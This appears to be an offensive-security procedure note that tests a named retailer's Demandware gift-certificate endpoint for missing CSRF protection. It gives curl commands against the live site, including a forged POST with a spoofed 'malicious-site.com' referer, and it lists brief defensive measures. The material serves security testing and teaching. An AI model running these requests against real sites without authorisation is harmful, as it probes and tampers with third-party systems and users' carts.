---
id: proc-identify-csrf-lack
tags:
  - csrf
  - web
  - vulnerability-scan
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-csrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:42.814Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-Lack-of-CSRF-Protection

## Summary

This procedure tests the GiftCert-AddToBasket endpoint for missing CSRF protections, confirming that forged POST requests can modify a user's cart without tokens or validation.

## Description

On Teavana's Demandware platform, the endpoint lacks CSRF tokens, enabling attackers to submit requests from external sites. This is tested by sending POST requests without session-bound tokens. The scenario targets authenticated users, with outcomes showing successful cart additions via unauthorized means.

## Requirements

1. HTTP client like curl
2. Valid session (optional for initial test; full exploit requires victim session)
3. Knowledge of endpoint parameters

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all state-changing endpoints
- Monitor for anomalous POST requests from external referers
- Implement SameSite cookie attributes

## Objectives

1. Confirm no CSRF token requirement
2. Validate forged request success
3. Assess exploitation feasibility

## Instructions

### Step 1: Inspect Endpoint for Tokens

**Context**: Check the legitimate form for CSRF fields.

**Command** ([[commands/curl-csrf-test]]):
```bash
curl -X GET "http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-Purchase" | grep -i csrf
```

> Searches response for CSRF-related elements. Expected output: No matches, indicating lack of protection.

### Step 2: Test Forged POST

**Context**: Submit POST without tokens to add to cart.

**Command** ([[commands/curl-csrf-test]]):
```bash
curl -X POST "http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-AddToBasket" \
  -d "dwfrm_giftcert_purchase_amount=100" \
  -H "Referer: http://malicious-site.com"
```

> Simulates cross-site request. Expected output: 200 OK or redirect, with cart updated.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-csrf-test]]

## Tools Used


## Tags

- [[csrf]]
- [[web]]
- [[vulnerability-scan]]
